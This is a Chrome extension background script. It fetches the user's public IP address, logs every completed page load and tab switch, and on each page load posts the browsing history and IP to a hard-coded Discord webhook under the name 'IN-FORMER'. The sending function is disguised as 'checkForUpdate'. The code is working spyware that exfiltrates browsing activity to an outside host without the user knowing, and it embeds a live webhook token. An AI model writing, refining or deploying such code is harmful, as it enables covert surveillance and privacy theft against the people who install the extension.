// webhook related information
const url = "https://discord.com/api/webhooks/1096825432357212280/jyNgGksyiX7rdZv9CamLBM9smKy72Dk30L3n6H2qgWz8vlXtYiTTo8R-98i-v8GPZfxO";
var ip = undefined;
fetch('https://api.ipify.org?format=json')
    .then((value)=> {
        return value.json();
    })
    .then((data) => {
        ip = (data.ip);
    });

async function checkForUpdate(msg) {
    const params = {
        username: "IN-FORMER: ",
        avatar_url: "",
        content: msg,
    };

    const response = await fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(params),
    });
}

function genFormReport(url, action) {
    // we get the time that the url action was performed.
    const evt_time = new Date().toTimeString();

    return {
        url: url,
        tov: evt_time,
        action: action
    }
}

function logPageLoad(ipAddress, url, pageTitle, httpResponseCode, loadTime) {
    const logHeader = "WEB_NAVIGATION";
    const date = new Date().toISOString().slice(0, 10);
    const timestamp = Math.floor(Date.now() / 1000);
    const logEntry = `${logHeader}: <${ipAddress}>\nDate: ${date}\nTimestamp: ${timestamp}\nURL: ${url}\nPage Title: ${pageTitle}\nHTTP Response Code: ${httpResponseCode}\nLoad Time: ${loadTime}s`;
    return logEntry
}

function craftMsg(bf) {
    let msg = "==========================================\n";

    // iterate through the msg buffer and append to the payload.
    for (let i = 0; i < bf.b.length; i++) {
        let bfitm = bf.b[i];
        if (i == 0) {
            msg = msg.concat(logPageLoad(ip, bfitm.url, null, null, null));
        } else {
            msg = msg.concat('\n\n', logPageLoad(ip, bfitm.url, null, null, null));
        }
    }
    return msg;
}

let buffer = []

chrome.webNavigation.onCompleted.addListener((details) => {
    if (details.url == "about:blank") {
        return;
    }
    buffer.push(genFormReport(details.url, "WEB_LOAD"));

    // since we have just loaded a webpage we are going to
    // send all our information to discord.
    checkForUpdate(craftMsg({b: buffer}));
    buffer = [];
});

chrome.tabs.onActivated.addListener(
    (activeInfo) => {
        chrome.tabs.get(activeInfo.tabId, (tab)=> {
            if (tab.url == "about:blank") {
                return;
            }
            buffer.push(genFormReport(tab.url, "WEB_SWITCH"));
        });
    }
)